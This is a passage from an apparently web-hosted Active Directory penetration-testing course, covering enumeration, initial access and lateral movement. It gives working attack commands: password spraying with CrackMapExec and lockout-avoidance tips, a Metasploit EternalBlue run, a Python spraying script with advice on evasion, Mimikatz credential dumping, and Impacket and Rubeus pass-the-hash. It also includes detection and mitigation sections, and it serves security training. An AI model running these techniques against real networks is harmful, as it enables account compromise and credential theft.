domain.</p>\n</li>\n</ul>\n<p><strong>2.6: Advanced Enumeration Tools</strong></p>\n<p>While the previous techniques are useful, there are also dedicated tools that automate and streamline the enumeration process.</p>\n<ul>\n<li><p><strong>2.6.1: <code>Nmap</code> scripting engine (NSE) scripts for AD enumeration.</strong></p>\n<p><code>Nmap</code>&#39;s NSE (Nmap Scripting Engine) provides a powerful way to automate network enumeration. There are several NSE scripts specifically designed for Active Directory enumeration.</p>\n<p><strong>Examples:</strong></p>\n<ul>\n<li><p><code>smb-enum-domains</code>:  Enumerates domain information via SMB.</p>\n<pre><code class=\"language-bash\">nmap --script smb-enum-domains -p445 dc01.yourdomain.local\n</code></pre>\n</li>\n<li><p><code>smb-enum-users</code>: Enumerates user accounts via SMB.</p>\n<pre><code class=\"language-bash\"> nmap --script smb-enum-users -p445 --script-args &#39;smbusername=yourusername,smbpassword=yourpassword&#39; dc01.yourdomain.local\n</code></pre>\n</li>\n<li><p><code>ldap-search</code>: Performs LDAP queries.</p>\n<pre><code class=\"language-bash\">nmap --script ldap-search -p389 --script-args &#39;ldap.base=&quot;dc=yourdomain,dc=local&quot;, ldap.filter=&quot;(objectClass=*)&quot;&#39; dc01.yourdomain.local\n</code></pre>\n</li>\n</ul>\n<p><strong>Why is this important?</strong> NSE scripts automate the enumeration process, saving you time and effort. They can also provide more detailed information than manual enumeration techniques.</p>\n</li>\n<li><p><strong>2.6.2: <code>Enum4Linux</code> for comprehensive enumeration.</strong></p>\n<p><code>Enum4Linux</code> is a Linux tool that automates many of the enumeration techniques we&#39;ve discussed. It performs a wide range of checks, including:</p>\n<ul>\n<li>NetBIOS enumeration</li>\n<li>RPC enumeration</li>\n<li>LDAP enumeration</li>\n<li>SMB enumeration</li>\n</ul>\n<p><strong>Example:</strong></p>\n<pre><code class=\"language-bash\">enum4linux -a dc01.yourdomain.local\n</code></pre>\n<p>The <code>-a</code> flag tells <code>Enum4Linux</code> to perform all checks.</p>\n<p><strong>Why is this important?</strong> <code>Enum4Linux</code> provides a comprehensive and automated way to enumerate the AD environment. It&#39;s a great tool for quickly gathering a lot of information.</p>\n</li>\n</ul>\n<p><strong>2.7: Case Study: Analyzing real-world enumeration findings and their impact.</strong></p>\n<p>Let&#39;s imagine a scenario where you&#39;re conducting a penetration test of a company&#39;s Active Directory environment. During enumeration, you discover the following:</p>\n<ul>\n<li><strong>Anonymous LDAP access is enabled:</strong> You can retrieve a list of all users, groups, and computers without providing any credentials.</li>\n<li><strong>A network share is accessible to everyone:</strong> This share contains sensitive documents, including payroll information and employee passwords.</li>\n<li><strong>A domain controller has an unpatched vulnerability:</strong> This vulnerability allows for remote code execution.</li>\n</ul>\n<p><strong>Impact:</strong></p>\n<ul>\n<li><strong>Compromise of user accounts:</strong> With anonymous LDAP access, you can easily identify user accounts with weak passwords and target them for password spraying attacks.</li>\n<li><strong>Data breach:</strong> The publicly accessible network share allows you to steal sensitive data, including payroll information and employee passwords.</li>\n<li><strong>Domain compromise:</strong> The unpatched vulnerability on the domain controller allows you to gain complete control of the AD environment.</li>\n</ul>\n<p><strong>Remediation:</strong></p>\n<ul>\n<li><strong>Disable anonymous LDAP access:</strong> Require authentication for LDAP queries.</li>\n<li><strong>Restrict access to the network share:</strong> Only allow authorized users to access the share.</li>\n<li><strong>Patch the domain controller:</strong> Apply the latest security patches to prevent exploitation of the vulnerability.</li>\n</ul>\n<p><strong>Why is this important?</strong> This case study highlights the importance of thorough enumeration. By identifying vulnerabilities early on, you can prevent a major security breach.</p>\n<hr>\n<p><strong>Module 2 Project: Active Directory Enumeration</strong></p>\n<ol>\n<li><p><strong>Environment:</strong> Use the Active Directory lab you built in Module 1.</p>\n</li>\n<li><p><strong>Tools:</strong> Utilize <code>nslookup</code>, <code>dig</code>, <code>ping</code>, <code>traceroute</code>, <code>ldapsearch</code>, <code>rpcclient</code>, <code>nmap</code>, <code>enum4linux</code>, and PowerShell cmdlets.</p>\n</li>\n<li><p><strong>Tasks:</strong></p>\n<ul>\n<li><p><strong>DNS Enumeration:</strong> Use <code>nslookup</code> and <code>dig</code> to gather DNS information about the AD environment. Document the domain controllers, service records, and hostnames you discover.</p>\n</li>\n<li><p><strong>LDAP Enumeration:</strong> Use <code>ldapsearch</code> to enumerate users, groups, computers, and OUs. Experiment with different LDAP filters to target specific information. Document your findings, including user accounts, group memberships, computer names, and OU structure.</p>\n</li>\n<li><p><strong>RPC Enumeration:</strong> Use <code>rpcclient</code> to explore RPC services and shares. Identify open ports and services using <code>nmap</code>. Gather NetBIOS information using <code>nbtscan</code>. Document your findings, including open ports, shared resources, and running services.</p>\n</li>\n<li><p><strong>PowerShell Enumeration:</strong> Use PowerShell cmdlets to enumerate users, groups, computers, GPOs, and trust relationships. Document your findings, including user accounts, group memberships, computer names, GPOs, and trust relationships.</p>\n</li>\n<li><p><strong>Automated Enumeration:</strong> Use <code>Nmap</code> NSE scripts and <code>Enum4Linux</code> to automate the enumeration process. Document your findings.</p>\n</li>\n<li><p><strong>Target Prioritization:</strong> Based on your findings, prioritize potential targets for further investigation. Identify accounts with weak passwords, systems with unpatched vulnerabilities, and shares with sensitive data.</p>\n</li>\n<li><p><strong>Script Development:</strong> Start building your personal enumeration script (Python or PowerShell) that automates the enumeration process. Include functionality to:</p>\n<ul>\n<li>Enumerate users, groups, and computers via LDAP.</li>\n<li>Identify open ports and services using <code>nmap</code>.</li>\n<li>Enumerate network shares using <code>rpcclient</code>.</li>\n<li>Export the results to a CSV file.</li>\n</ul>\n</li>\n</ul>\n</li>\n<li><p><strong>Documentation:</strong>  Document all steps taken during the enumeration process. Include screenshots and code snippets to illustrate your findings.  Document the potential impact of each vulnerability.</p>\n</li>\n</ol>\n<p>This project will give you hands-on experience with the various enumeration techniques we&#39;ve discussed. It will also help you develop your own custom enumeration script, which will be a valuable tool in your penetration testing arsenal. Remember to focus on understanding <em>why</em> you are doing each step, not just blindly following instructions. This understanding will allow you to adapt these techniques to different environments and situations. Good luck!</p>\n\n                </div>\n             </div>\n         ",
    "module-3": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 3: module_3</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Alright, let&#39;s dive into Module 3: Initial Access! This is where we go from gathering information to actually trying to get a foothold inside the Active Directory environment. We&#39;ll focus heavily on password spraying and touch on exploiting vulnerabilities. Remember, this is all about <em>understanding</em> the techniques, so we&#39;ll build our own basic tools along the way.</p>\n<h1>Module 3: Initial Access - Gaining a Foothold</h1>\n<p><strong>Module Objective:</strong> Learn and practice techniques to gain initial access to the Active Directory environment, simulating the first stage of a penetration test.</p>\n<h2>3.1 Understanding the Attack Surface</h2>\n<p>Before we start launching attacks, let&#39;s think like an attacker. What are the potential entry points into our Active Directory domain?</p>\n<ul>\n<li><strong>User Accounts:</strong> The most common target. We&#39;ll be focusing on these.</li>\n<li><strong>Workstations:</strong> If a workstation is compromised, it can be used as a springboard to attack other systems.</li>\n<li><strong>Servers:</strong> Servers often run critical services and may have vulnerabilities.</li>\n<li><strong>Web Applications:</strong> If the AD environment integrates with web applications, vulnerabilities in those apps could lead to AD compromise.</li>\n<li><strong>Network Devices:</strong> Less common but still a possibility.</li>\n</ul>\n<p>In this module, we&#39;ll primarily focus on targeting user accounts because they represent a readily accessible and often vulnerable attack surface.</p>\n<h2>3.2 Assumed Compromise</h2>\n<p>For some techniques, we&#39;ll start from the perspective of having already compromised a workstation. This is a common scenario in real-world attacks. Think of it as having phished a user or exploited a vulnerability on their machine.  This gives us a local foothold to launch further attacks.  We&#39;ll cover how to actually get to this state in later modules.</p>\n<h2>3.3 Password Spraying</h2>\n<p>Password spraying is a low-and-slow attack that attempts to log in to multiple accounts with a small number of common passwords. The goal is to avoid account lockout, which is a common security measure.</p>\n<h3>3.3.1 Understanding Password Policies and Common Password Patterns</h3>\n<ul>\n<li><strong>Password Policies:</strong> Active Directory password policies define the complexity, length, and age requirements for passwords. Common settings include:<ul>\n<li>Minimum password length</li>\n<li>Password complexity requirements (uppercase, lowercase, numbers, symbols)</li>\n<li>Password history (preventing reuse of previous passwords)</li>\n<li>Account lockout threshold (number of failed login attempts before account lockout)</li>\n<li>Account lockout duration</li>\n</ul>\n</li>\n<li><strong>Common Password Patterns:</strong> Attackers often target common password patterns, such as:<ul>\n<li><code>Password123</code></li>\n<li><code>Summer2023</code></li>\n<li><code>CompanyName123</code> (replace with actual company name)</li>\n<li>The current year appended to a simple word (e.g., <code>Winter2024</code>)</li>\n<li>Keyboard patterns (e.g., <code>qwerty</code>)</li>\n<li>Default passwords</li>\n</ul>\n</li>\n</ul>\n<h3>3.3.2 Tools for Password Spraying</h3>\n<p>Several tools can be used for password spraying. Here are some popular options:</p>\n<ul>\n<li><strong>Hydra:</strong> A versatile password cracking tool that supports many protocols.</li>\n<li><strong>Medusa:</strong> Similar to Hydra, but with a different architecture.</li>\n<li><strong>Ncrack:</strong> A network authentication cracking tool from the Nmap project.</li>\n<li><strong>CrackMapExec (CME):</strong> A powerful post-exploitation tool that includes password spraying functionality.</li>\n</ul>\n<p>We&#39;ll use <code>CrackMapExec</code> for this module because it&#39;s specifically designed for attacking Windows networks and has built-in evasion techniques.</p>\n<p><strong>Installation (if you don&#39;t have it already):</strong></p>\n<pre><code class=\"language-bash\"># Assumes you have Python and pip installed\npip3 install crackmapexec\n</code></pre>\n<h3>3.3.3 Using CrackMapExec for Password Spraying</h3>\n<p>Here&#39;s how to use CrackMapExec to perform a password spraying attack:</p>\n<ol>\n<li><p><strong>Create a User List:</strong> Create a text file (<code>users.txt</code>) containing a list of usernames to target. You can get this list from Module 2&#39;s enumeration.</p>\n</li>\n<li><p><strong>Create a Password List:</strong> Create a text file (<code>passwords.txt</code>) containing a list of common passwords to try. Keep it short to avoid lockouts.</p>\n</li>\n<li><p><strong>Run CrackMapExec:</strong></p>\n<pre><code class=\"language-bash\">crackmapexec smb &lt;domain_controller_ip&gt; -u users.txt -p passwords.txt --shares --continue-on-success\n</code></pre>\n<ul>\n<li><code>smb</code>: Specifies the SMB protocol (used for Windows file sharing and authentication).</li>\n<li><code>&lt;domain_controller_ip&gt;</code>: The IP address of your Domain Controller.</li>\n<li><code>-u users.txt</code>: Specifies the user list file.</li>\n<li><code>-p passwords.txt</code>: Specifies the password list file.</li>\n<li><code>--shares</code>: Attempts to list shares after successful login (useful for verification).</li>\n<li><code>--continue-on-success</code>: Continues spraying even after finding a valid password.  This is crucial for not locking out all the other accounts if you get one right early on.</li>\n</ul>\n</li>\n</ol>\n<p><strong>Example:</strong></p>\n<p>Let&#39;s say our Domain Controller IP is <code>192.168.1.10</code>, our <code>users.txt</code> contains:</p>\n<pre><code>administrator\njohn.doe\njane.smith\n</code></pre>\n<p>And our <code>passwords.txt</code> contains:</p>\n<pre><code>Password123\nSummer2023\n</code></pre>\n<p>Then the command would be:</p>\n<pre><code class=\"language-bash\">crackmapexec smb 192.168.1.10 -u users.txt -p passwords.txt --shares --continue-on-success\n</code></pre>\n<p><strong>Interpreting the Results:</strong></p>\n<p>CrackMapExec will output the results of each login attempt. Look for lines that indicate successful logins (usually marked with <code>+</code> or <code>SUCCESS</code>).  If you find a successful login, document it!</p>\n<h3>3.3.4 Avoiding Account Lockout</h3>\n<p>Account lockout is the biggest risk with password spraying. Here are some techniques to avoid it:</p>\n<ul>\n<li><strong>Use a Small Password List:</strong> Start with a very small list of common passwords (e.g., 3-5 passwords).</li>\n<li><strong>Space Out Attempts:</strong> Use the <code>--delay</code> option in CrackMapExec to add a delay between login attempts. This will make the attack slower but less likely to trigger lockout.  For example, <code>--delay 5</code> adds a 5-second delay.</li>\n<li><strong>Target Specific Accounts:</strong> Focus on accounts that are less likely to be actively monitored (e.g., service accounts, old accounts).</li>\n<li><strong>Monitor Account Lockout Policies:</strong>  Before you start, try to determine the account lockout policy. You can sometimes find this information through enumeration (Module 2).</li>\n</ul>\n<h3>3.3.5 Detecting and Mitigating Password Spraying Attacks</h3>\n<p>As a defender, how would you detect and mitigate password spraying attacks?</p>\n<ul>\n<li><strong>Monitor Login Events:</strong> Analyze Windows event logs for failed login attempts. Look for patterns of failed logins from the same source IP address to multiple user accounts.  Specifically, look for Event ID 4625 (An account failed to log on).</li>\n<li><strong>Implement Account Lockout Policies:</strong> Ensure that account lockout policies are properly configured and enforced.</li>\n<li><strong>Use Multi-Factor Authentication (MFA):</strong> MFA adds an extra layer of security that makes it much harder for attackers to gain access, even if they have a valid password.</li>\n<li><strong>Password Complexity Requirements:</strong> Enforce strong password complexity requirements to make it harder for attackers to guess passwords.</li>\n<li><strong>Password Monitoring:</strong> Use tools to monitor for leaked credentials and proactively reset passwords if necessary.</li>\n</ul>\n<h2>3.4 Credential Stuffing (Brief Overview)</h2>\n<p>Credential stuffing is a similar attack to password spraying, but instead of using common passwords, it uses leaked credentials from other breaches. Attackers obtain lists of usernames and passwords from data breaches and try them against various websites and services, including Active Directory.</p>\n<p><strong>Why it Works:</strong> People often reuse the same username and password across multiple accounts.</p>\n<p><strong>How to Mitigate:</strong> The same mitigation strategies as password spraying apply.  In addition, users should be educated on the importance of using unique passwords for each account.</p>\n<p><strong>Note:</strong> We won&#39;t be focusing on credential stuffing in this module, but it&#39;s important to be aware of it.</p>\n<h2>3.5 Exploiting Vulnerable Services (Brief Overview)</h2>\n<p>While password spraying targets user accounts, exploiting vulnerable services targets flaws in the software running on systems within the AD environment.</p>\n<h3>3.5.1 Identifying Vulnerable Services</h3>\n<p>We can use tools like Nmap to scan for open ports and identify the services running on those ports. Once we know what services are running, we can search for known vulnerabilities.  We touched on this in Module 2.</p>\n<pre><code class=\"language-bash\">nmap -sV &lt;target_ip&gt;\n</code></pre>\n<p>The <code>-sV</code> option tells Nmap to perform version detection, which attempts to identify the specific version of each service.</p>\n<h3>3.5.2 Exploiting Known Vulnerabilities</h3>\n<p>Once we&#39;ve identified a vulnerable service, we can use exploit databases like Exploit-DB or Metasploit to find exploits.</p>\n<p><strong>Example: EternalBlue (MS17-010)</strong></p>\n<p>EternalBlue is a vulnerability in the Server Message Block (SMB) protocol that was exploited in the WannaCry ransomware attack.</p>\n<p>If you identify a system running a vulnerable version of SMB, you could use Metasploit to exploit it.</p>\n<pre><code class=\"language-bash\"># Start Metasploit\nmsfconsole\n\n# Search for the EternalBlue exploit\nsearch eternalblue\n\n# Use the exploit\nuse exploit/windows/smb/ms17_010_eternalblue\n\n# Set the target IP address\nset RHOST &lt;target_ip&gt;\n\n# Run the exploit\nexploit\n</code></pre>\n<p><strong>Important:</strong> Exploiting vulnerabilities can be risky and may cause system instability.  Only perform these actions in a controlled lab environment.</p>\n<p><strong>Note:</strong> We&#39;ll cover vulnerability exploitation in more detail in later modules.  For now, focus on understanding how to identify vulnerable services.</p>\n<h2>3.6 Case Study: Analyzing Real-World Initial Access Scenarios and Mitigation Strategies</h2>\n<p>Let&#39;s look at a few real-world examples of how attackers gain initial access and how to prevent it:</p>\n<ul>\n<li><p><strong>Scenario 1: Password Spraying against Office 365</strong></p>\n<ul>\n<li><strong>Attack:</strong> Attackers used a large list of compromised usernames and a smaller list of common passwords to target Office 365 accounts.</li>\n<li><strong>Impact:</strong> They gained access to email accounts, allowing them to send phishing emails internally and steal sensitive data.</li>\n<li><strong>Mitigation:</strong> Implement MFA, enforce strong password policies, and monitor login events for suspicious activity.</li>\n</ul>\n</li>\n<li><p><strong>Scenario 2: Exploiting a Vulnerable Web Application</strong></p>\n<ul>\n<li><strong>Attack:</strong> Attackers exploited a SQL injection vulnerability in a web application that was connected to the Active Directory database.</li>\n<li><strong>Impact:</strong> They were able to extract user credentials from the database and use them to log in to the Active Directory domain.</li>\n<li><strong>Mitigation:</strong> Secure web applications by patching vulnerabilities, using parameterized queries, and implementing input validation.</li>\n</ul>\n</li>\n<li><p><strong>Scenario 3: Phishing Attack with Malware</strong></p>\n<ul>\n<li><strong>Attack:</strong> Attackers sent phishing emails containing malicious attachments. When users opened the attachments, they installed malware that allowed the attackers to gain access to their workstations.</li>\n<li><strong>Impact:</strong> The attackers were able to steal credentials and move laterally within the network.</li>\n<li><strong>Mitigation:</strong> Train users to recognize phishing emails, implement email security filters, and use endpoint detection and response (EDR) solutions.</li>\n</ul>\n</li>\n</ul>\n<h2>3.7 Module Project: Password Spraying and Tool Development</h2>\n<p>This module project has two parts:</p>\n<ol>\n<li><strong>Password Spraying in the Lab:</strong> Attempt to gain initial access to your lab environment using password spraying against valid user accounts. Document your attempts, successes, and failures.</li>\n<li><strong>Build a Simple Password Spraying Tool:</strong> Refine your enumeration script from Module 2 to automatically identify accounts with weak or default passwords. Begin building a simple password spraying tool using Python or PowerShell, incorporating evasion techniques.</li>\n</ol>\n<h3>3.7.1 Password Spraying in the Lab (Detailed Steps)</h3>\n<ol>\n<li><strong>Prepare Your Environment:</strong> Ensure your Active Directory lab is running and accessible.</li>\n<li><strong>User and Password Lists:</strong> Create <code>users.txt</code> and <code>passwords.txt</code>.  Start with a <em>very</em> small password list.</li>\n<li><strong>Execute CrackMapExec:</strong> Run the <code>crackmapexec</code> command as shown above.</li>\n<li><strong>Analyze Results:</strong> Carefully review the output from CrackMapExec.</li>\n<li><strong>Document Your Findings:</strong>  Record:<ul>\n<li>The commands you used.</li>\n<li>The contents of your <code>users.txt</code> and <code>passwords.txt</code> files.</li>\n<li>Any successful logins.</li>\n<li>Any account lockouts.</li>\n<li>Your observations and lessons learned.</li>\n</ul>\n</li>\n</ol>\n<h3>3.7.2 Building a Simple Password Spraying Tool (Python Example)</h3>\n<p>Here&#39;s a basic Python example to get you started.  This is <em>very</em> basic and lacks error handling, evasion, and other important features.  Your goal is to expand on this.</p>\n<pre><code class=\"language-python\">import smb.SMB_V1_0 as SMB\nimport socket\nimport time\n\ndef spray_password(target_ip, username, password, domain):\n    &quot;&quot;&quot;Attempts to authenticate to an SMB share with the given credentials.&quot;&quot;&quot;\n    try:\n        # Create SMB connection\n        conn = SMB.SMB(username, password, &quot;attacker&quot;, &quot;server&quot;, domain=domain, is_direct_tcp=True) # Replace attacker and server with appropriate values\n\n        # Connect to the target\n        conn.connect(target_ip, 445)\n\n        print(f&quot;[+] Successfully authenticated to {target_ip} as {username} with password {password}&quot;)\n        conn.close()\n        return True\n\n    except socket.timeout:\n        print(f&quot;[-] Timeout connecting to {target_ip}&quot;)\n        return False\n    except Exception as e:\n        if &quot;STATUS_WRONG_PASSWORD&quot; in str(e):\n            print(f&quot;[-] Incorrect password for {username}@{domain} on {target_ip}&quot;)\n            return False\n        elif &quot;STATUS_ACCOUNT_LOCKED_OUT&quot; in str(e):\n            print(f&quot;[!] Account {username} locked out on {target_ip}&quot;)\n            return False\n        else:\n            print(f&quot;[-] Error: {e}&quot;)\n            return False\n\nif __name__ == &quot;__main__&quot;:\n    target_ip = &quot;192.168.1.10&quot;  # Replace with your DC IP\n    domain = &quot;YOURDOMAIN.LOCAL&quot;  # Replace with your domain\n    users = [&quot;administrator&quot;, &quot;john.doe&quot;, &quot;jane.smith&quot;]\n    passwords = [&quot;Password123&quot;, &quot;Summer2023&quot;]\n\n    for user in users:\n        for password in passwords:\n            success = spray_password(target_ip, user, password, domain)\n            if success:\n                break  # Stop trying passwords for this user\n            time.sleep(2) # Add a small delay\n</code></pre>\n<p><strong>Explanation:</strong></p>\n<ol>\n<li><strong>Import Libraries:</strong> Imports the necessary libraries for SMB communication, socket operations, and time delays.</li>\n<li><strong><code>spray_password</code> Function:</strong><ul>\n<li>Takes the target IP, username, password, and domain as input.</li>\n<li>Attempts to establish an SMB connection to the target using the provided credentials.</li>\n<li>Handles potential exceptions, such as incorrect password, account lockout, and connection errors.</li>\n<li>Prints informative messages based on the outcome of the authentication attempt.</li>\n</ul>\n</li>\n<li><strong>Main Execution Block:</strong><ul>\n<li>Sets the target IP, domain, user list, and password list.</li>\n<li>Iterates through the user list and password list, calling the <code>spray_password</code> function for each combination.</li>\n<li>Adds a small delay between login attempts to avoid account lockout.</li>\n</ul>\n</li>\n</ol>\n<p><strong>To run this:</strong></p>\n<ol>\n<li><strong>Install <code>pysmb</code>:</strong> <code>pip3 install pysmb</code> (This library is used for SMB communication).</li>\n<li><strong>Replace Placeholders:</strong> Update <code>target_ip</code> and <code>domain</code> with your lab values.</li>\n<li><strong>Run the script:</strong> <code>python3 your_script_name.py</code></li>\n</ol>\n<p><strong>Next Steps:</strong></p>\n<ul>\n<li><strong>Error Handling:</strong> Add more robust error handling.</li>\n<li><strong>Command-Line Arguments:</strong> Use <code>argparse</code> to allow users to specify the target IP, user list, and password list from the command line.</li>\n<li><strong>Evasion:</strong> Implement techniques to avoid detection (e.g., randomizing the order of usernames, using different source IPs).  This is crucial for a real-world attack.</li>\n<li><strong>Logging:</strong> Add logging to record all login attempts and their outcomes.</li>\n<li><strong>Integration with Enumeration:</strong>  Modify your Module 2 enumeration script to output a list of usernames suitable for this tool.</li>\n<li><strong>Threading:</strong>  Use threading to speed up the attack (but be careful about lockouts!).</li>\n</ul>\n<p>This module is about understanding the basics of initial access.  By building your own tool, you&#39;ll gain a much deeper understanding of how these attacks work and how to defend against them.  Good luck!</p>\n\n                </div>\n             </div>\n         ",
    "module-4": "\n             <div class=\"card main-content-card\"> <!-- Added main-content-card class -->\n                <h1>Module 4: module_4</h1> <!-- Use module title here -->\n                <div class=\"markdown-content\">\n                    <p>Okay, let&#39;s dive deep into Module 4: Lateral Movement. This is where things get <em>really</em> interesting! We&#39;ll be focusing on how to move from an initial foothold (a compromised workstation or user account) to gain access to more privileged resources within the Active Directory environment.</p>\n<h1>Module 4: Lateral Movement - Expanding Your Reach</h1>\n<p><strong>Module Objective:</strong> Learn and apply techniques to move laterally within the Active Directory environment, gaining access to more privileged accounts and systems.</p>\n<h2>4.1 Understanding Lateral Movement</h2>\n<ul>\n<li><p><strong>Why is it crucial for domain compromise?</strong></p>\n<p>Lateral movement is the art of pivoting from one compromised system to another.  Think of it like navigating a maze.  Initial access is just the entrance.  Domain compromise is reaching the center, and lateral movement is the series of turns and paths you take to get there.  It&#39;s crucial because:</p>\n<ul>\n<li><strong>Privilege Escalation:</strong>  The initial compromise might be a low-privilege user. Lateral movement allows you to find and compromise accounts with higher privileges.</li>\n<li><strong>Data Access:</strong>  Critical data is rarely stored on a single system. Lateral movement lets you access data stored across the network.</li>\n<li><strong>Persistence:</strong>  If your initial foothold is discovered and removed, lateral movement allows you to maintain access through other compromised systems.</li>\n<li><strong>Domain Dominance:</strong>  Ultimately, lateral movement aims to compromise domain controllers or accounts with administrative privileges, granting full control of the Active Directory environment.</li>\n</ul>\n</li>\n</ul>\n<h2>4.2 Pass-the-Hash (PtH)</h2>\n<ul>\n<li><p><strong>Understanding NTLM hashes and their use in authentication:</strong></p>\n<p>NTLM (NT LAN Manager) is an older authentication protocol still widely used in many Active Directory environments. Instead of transmitting passwords in plaintext, NTLM uses a hash of the password.  This hash can be used to authenticate to other systems without knowing the actual password.  The NTLM hash is a 16-byte MD4 hash of the UTF-16LE representation of the password.</p>\n<ul>\n<li><strong>Why is this a problem?</strong>  If you can obtain the NTLM hash of a user account, you can use it to authenticate to other systems where that user has access.  This bypasses the need to crack the password itself.  This is the core principle of Pass-the-Hash.</li>\n</ul>\n</li>\n<li><p><strong>Tools:</strong></p>\n<ul>\n<li><strong>Mimikatz:</strong>  A powerful post-exploitation tool that can extract credentials, including NTLM hashes, from memory.  It&#39;s a must-have for any penetration tester.</li>\n<li><strong>Impacket:</strong>  A collection of Python classes for working with network protocols.  It includes tools for performing PtH attacks.</li>\n<li><strong>Metasploit:</strong>  A penetration testing framework that includes modules for performing PtH attacks.</li>\n</ul>\n</li>\n<li><p><strong>Example using Mimikatz:</strong></p>\n<p>First, you need to get Mimikatz onto the compromised system.  This is outside the scope of this module (we&#39;re assuming a compromised host).  Then, execute Mimikatz:</p>\n<pre><code class=\"language-powershell\"># Run Mimikatz (you might need to bypass AV)\n.\\mimikatz.exe\n</code></pre>\n<p>Inside Mimikatz:</p>\n<pre><code>privilege::debug  # Elevate privileges\nsekurlsa::logonpasswords  # Extract credentials\n</code></pre>\n<p>This will output a lot of information, including the NTLM hashes of logged-on users.  Look for the <code>NT hash</code> value.</p>\n</li>\n<li><p><strong>Example using Impacket&#39;s <code>psexec.py</code>:</strong></p>\n<p><code>psexec.py</code> allows you to execute commands on a remote system using PtH.  You&#39;ll need the NTLM hash, the username, and the target system&#39;s IP address.</p>\n<pre><code class=\"language-bash\"># Example usage\npython3 psexec.py domain/username@target_ip -hashes lmhash:nthash -c &quot;whoami&quot;\n</code></pre>\n<ul>\n<li><code>domain/username</code>: The domain and username of the account whose hash you have.</li>\n<li><code>target_ip</code>: The IP address of the target system.</li>\n<li><code>-hashes lmhash:nthash</code>:  Specifies the LM and NT hashes.  If you only have the NT hash, you can use <code>aad3b435b51404eeaad3b435b51404ee:nthash</code> as the LM hash is usually a default value.</li>\n<li><code>-c &quot;whoami&quot;</code>:  The command to execute on the remote system.</li>\n</ul>\n</li>\n<li><p><strong>Mitigation Strategies:</strong></p>\n<ul>\n<li><strong>Disabling NTLM:</strong>  The best long-term solution is to migrate to Kerberos-only authentication.  This is a complex process but significantly reduces the attack surface.  Use Group Policy to restrict NTLM usage.</li>\n<li><strong>Protected Users Group:</strong>  Adding users to the Protected Users group enforces stronger authentication mechanisms and prevents the caching of credentials.</li>\n<li><strong>Account Monitoring:</strong>  Monitor for suspicious authentication activity, such as multiple failed login attempts or logins from unusual locations.</li>\n<li><strong>Enable LSA Protection (RunAsPPL):</strong>  This protects the Local Security Authority (LSA) process, making it harder for Mimikatz to extract credentials from memory.  This requires a reboot.</li>\n</ul>\n</li>\n</ul>\n<h2>4.3 Pass-the-Ticket (PtT)</h2>\n<ul>\n<li><p><strong>Understanding Kerberos tickets (TGTs and Service Tickets):</strong></p>\n<p>Kerberos is the default authentication protocol in modern Active Directory environments.  It uses tickets to grant access to resources.</p>\n<ul>\n<li><strong>Ticket Granting Ticket (TGT):</strong>  Obtained when a user initially authenticates.  It&#39;s like a master key that allows the user to request service tickets.</li>\n<li><strong>Service Ticket:</strong>  Granted for accessing a specific service (e.g., a file share, a database).  It&#39;s like a key specifically for a particular door.</li>\n</ul>\n</li>\n<li><p><strong>Why is this a problem?</strong>  If you can obtain a valid Kerberos ticket (either a TGT or a service ticket), you can use it to authenticate to the corresponding service without knowing the user&#39;s password.</p>\n</li>\n<li><p><strong>Tools:</strong></p>\n<ul>\n<li><strong>Mimikatz:</strong>  Can be used to extract Kerberos tickets from memory and inject them into the current session.</li>\n<li><strong>Impacket:</strong>  Provides tools for manipulating Kerberos tickets.</li>\n</ul>\n</li>\n<li><p><strong>Example using Mimikatz:</strong></p>\n<pre><code class=\"language-powershell\"># Run Mimikatz\n.\\mimikatz.exe\n\n# Extract Kerberos tickets\nkerberos::tktpass\n\n# Import a specific ticket (if you have a .kirbi file)\nkerberos::ptt &lt;ticket_file.kirbi&gt;\n</code></pre>\n</li>\n<li><p><strong>Example using Impacket&#39;s <code>ticketer.py</code>:</strong></p>\n<p><code>ticketer.py</code> can be used to forge Kerberos tickets. This is more advanced and requires a deeper understanding of Kerberos.</p>\n</li>\n<li><p><strong>Mitigation Strategies:</strong></p>\n<ul>\n<li><strong>Kerberos Armoring (Flexible Authentication Secure Tunneling - FAST):</strong>  Encrypts the Kerberos authentication process, preventing attackers from intercepting and replaying tickets.</li>\n<li><strong>Account Monitoring:</strong>  Monitor for suspicious ticket requests or unusual access patterns.</li>\n<li><strong>Implement Privileged Access Workstations (PAWs):</strong>  Dedicated, hardened workstations for administrative tasks.</li>\n<li><strong>Limit Ticket Lifetime:</strong> Configure shorter Kerberos ticket lifetimes, reducing the window of opportunity for attackers.</li>\n</ul>\n</li>\n</ul>\n<h2>4.4 Overpass-the-Hash (OtH)</h2>\n<ul>\n<li><p><strong>Bypassing NTLM restrictions with Kerberos:</strong></p>\n<p>In environments where NTLM is restricted, Overpass-the-Hash leverages Kerberos to use an NTLM hash to obtain a Kerberos ticket. This ticket can then be used to access resources. This is a more advanced technique and relies on specific configurations.</p>\n</li>\n<li><p><strong>Tools:</strong></p>\n<ul>\n<li><strong>Rubeus:</strong> A C# tool for Kerberos abuse.</li>\n<li><strong>Impacket:</strong> Can be used, though Rubeus is often preferred.</li>\n</ul>\n</li>\n<li><p><strong>Example Using Rubeus</strong></p>\n<pre><code>Rubeus.exe asktgt /user:username /domain:domain.local /ntlm:HASH /ptt\n</code></pre>\n<p>  Where:</p>\n<ul>\n<li><code>username</code> is the username.</li>\n<li><code>domain.local</code> is the domain.</li>\n<li><code>HASH</code> is the NTLM hash.</li>\n<li><code>/ptt</code> injects the ticket into the current session.</li>\n</ul>\n</li>\n<li><p><strong>Mitigation Strategies:</strong></p>\n<ul>\n<li>Focus on mitigations for NTLM and Kerberos vulnerabilities, as OTH exploits these.</li>\n</ul>\n</li>\n</ul>\n<h2>4.5 Impacket</h2>\n<ul>\n<li><p><strong>A powerful Python library for network protocols:</strong></p>\n<p>Impacket is an incredibly valuable tool for penetration testers. It provides a collection of Python classes for working with network protocols, including SMB, NTLM, Kerberos, and more.  It&#39;s used extensively for lateral movement and post-exploitation.</p>\n</li>\n<li><p><strong><code>psexec.py</code>, <code>smbexec.py</code>, <code>wmiexec.py</code>: Remote code execution techniques:</strong></p>\n<p>These are Impacket scripts that allow you to execute commands on a remote system.  They use different methods for remote code execution:</p>\n<ul>\n<li><strong><code>psexec.py</code>:</strong>  Creates a service on the target system and uses it to execute commands.  It&#39;s a classic technique but can be easily detected. Requires SMB.</li>\n<li><strong><code>smbexec.py</code>:</strong>  Similar to <code>psexec.py</code> but uses a different method for creating the service. Also requires SMB.</li>\n<li><strong><code>wmiexec.py</code>:</strong>  Uses Windows Management 